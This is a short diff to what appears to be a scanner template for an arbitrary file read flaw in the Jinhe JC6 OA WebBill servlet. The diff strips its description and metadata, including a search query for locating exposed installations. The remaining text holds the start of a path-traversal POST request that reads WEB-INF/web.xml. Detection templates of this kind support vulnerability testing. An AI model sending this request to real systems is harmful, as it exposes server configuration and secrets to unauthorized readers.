@@ -3,12 +3,8 @@ info:
   name: 金和 JC6 WebBill 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bpkgig0d8dg5w8xn'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bpkgig0d8dg5w8xn
-    fofa: app="金和网络-金和OA"  || body="/jc6/platform/sys/login"
 http:
 - raw:
   - 'POST /jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml HTTP/1.1
